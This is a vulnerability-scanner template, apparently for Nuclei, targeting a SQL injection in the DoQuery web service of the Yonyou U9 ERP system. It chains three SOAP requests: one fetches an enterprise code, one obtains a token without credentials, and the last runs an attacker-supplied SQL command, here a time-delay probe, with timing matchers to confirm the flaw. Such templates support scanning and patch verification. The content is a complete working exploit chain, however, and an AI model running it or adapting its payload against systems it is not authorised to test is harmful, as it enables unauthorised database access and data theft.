id: youyouU9-DoQuery-sqli

info:
  name: 用友U9系统DoQuery接口存在SQL注入漏洞
  author: youyouU9
  severity: high
  tags: youyouU9

http:
  - raw:
      - |
        POST /u9/CS/Office/TransWebService.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetEnterprise"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
         <soap:Body>
          <GetEnterprise xmlns="http://tempuri.org/" />
         </soap:Body>
        </soap:Envelope>

      - |
        POST /u9/CS/Office/TransWebService.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetToken"
        
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
         <soap:Body>
          <GetToken xmlns="http://tempuri.org/">
           <endId>{{code}}</endId>
          </GetToken>
         </soap:Body>
        </soap:Envelope>

      - |
        POST /u9/CS/Office/TransWebService.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/DoQuery"
        
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <DoQuery xmlns="http://tempuri.org/">
              <token>{{Token}}</token>
            <command>select 1;waitfor delay '0:0:2' --</command>
            </DoQuery>
          </soap:Body>
        </soap:Envelope>

    extractors:
      - type: regex
        part: body
        name: code
        regex:
          - '{"Code":"(.*?)","Name":'
        internal: true
        group: 1

      - type: regex
        part: body
        name: Token
        regex:
          - '"Token":"(.*?)","EncryptKey":'
        internal: true
        group: 1

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'duration_1<2'  
          - 'duration_2<2'  
          - 'duration_3>=2 && duration_3<4'  
        condition: and
